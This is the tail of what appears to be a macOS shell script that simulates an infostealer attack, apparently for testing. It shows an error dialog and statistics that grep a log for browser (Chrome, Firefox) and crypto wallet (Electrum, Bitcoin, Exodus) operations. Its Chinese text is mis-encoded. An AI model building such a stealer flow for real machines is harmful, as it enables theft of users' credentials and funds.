    display dialog \"æ¨¡æ‹Ÿè¿‡ç¨‹å‡ºç°é”™è¯¯: \" & errorMessage buttons {\"ç¡®å®š\"} default button \"ç¡®å®š\"
end try
'"

echo ""
echo "âœ… æ¶æ„è½¯ä»¶æ”»å‡»æµç¨‹æ¨¡æ‹Ÿæ‰§è¡Œå®Œæˆï¼"
echo ""

if [ -f "/tmp/malware_simulation.log" ]; then
    echo "ğŸ“Š æ“ä½œç»Ÿè®¡:"
    echo "============"
    total_ops=$(grep -c "æ¨¡æ‹Ÿ:" /tmp/malware_simulation.log 2>/dev/null || echo 0)
    browser_ops=$(grep -c "å¤„ç†æµè§ˆå™¨\|å¤„ç†.*Chrome\|å¤„ç†.*Firefox" /tmp/malware_simulation.log 2>/dev/null || echo 0)
    wallet_ops=$(grep -c "å¤„ç†é’±åŒ…\|Electrum\|Bitcoin\|Exodus" /tmp/malware_simulation.log 2>/dev/null || echo 0)
    
    echo "ğŸ“ˆ æ€»æ¨¡æ‹Ÿæ“ä½œ: $total_ops"
    echo "ğŸŒ æµè§ˆå™¨æ“ä½œ: $browser_ops" 
    echo "ğŸ’° é’±åŒ…æ“ä½œ: $wallet_ops"
    echo ""
    echo "ğŸ“„ å®Œæ•´æ—¥å¿—: /tmp/malware_simulation.log"
else
    echo "âš ï¸ æœªç”Ÿæˆæ—¥å¿—æ–‡ä»¶"
fi 
